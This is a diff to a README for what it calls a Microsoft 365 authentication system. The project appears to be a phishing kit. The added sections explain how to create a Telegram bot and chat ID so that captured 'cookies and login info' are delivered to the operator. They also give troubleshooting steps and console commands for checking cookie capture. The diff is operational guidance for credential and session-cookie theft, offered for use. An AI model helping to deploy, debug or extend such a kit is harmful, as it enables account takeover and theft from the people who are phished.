@@ -70,11 +70,43 @@ A complete Microsoft 365 authentication system built with React, TypeScript, and
    UPSTASH_REDIS_REST_TOKEN=your_redis_token
    ```
 
+   **⚠️ IMPORTANT**: After adding environment variables in Netlify dashboard, **redeploy** your site for changes to take effect.
+
+   **Telegram Setup Steps**:
+   1. Message `@BotFather` on Telegram → `/newbot` → follow instructions
+   2. Message `@userinfobot` on Telegram → get your chat ID
+   3. Add both values as environment variables in Netlify
+   4. Redeploy the site
+
 3. **Deploy**
    ```bash
    npm run build
    # Deploy dist/ folder to Netlify
    ```
+
+## 🔧 Troubleshooting
+
+### Telegram Not Working?
+
+If you're not receiving cookies and login info in Telegram:
+
+1. **Check Environment Variables**: Ensure `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` are set in Netlify dashboard
+2. **Redeploy**: After adding environment variables, redeploy your site
+3. **Test Your Bot**: Message your bot directly to ensure it's working
+4. **Use Debug Tools**: Open browser console and run:
+   ```javascript
+   window.telegramDebugger.runFullDiagnostic()
+   ```
+5. **Check Logs**: Go to Netlify Functions → sendTelegram → Logs for error details
+
+**📖 Detailed Troubleshooting**: See `TELEGRAM_TROUBLESHOOTING.md` for comprehensive solutions.
+
+### Quick Debug Commands
+
+Open browser console (F12) and run:
+- `window.telegramDebugger.testTelegramFunction()` - Test Telegram connectivity
+- `window.telegramDebugger.checkCookies()` - Check cookie capture
+- `window.telegramDebugger.checkEnvironment()` - Verify setup
 
 ## 📁 Project Structure
 
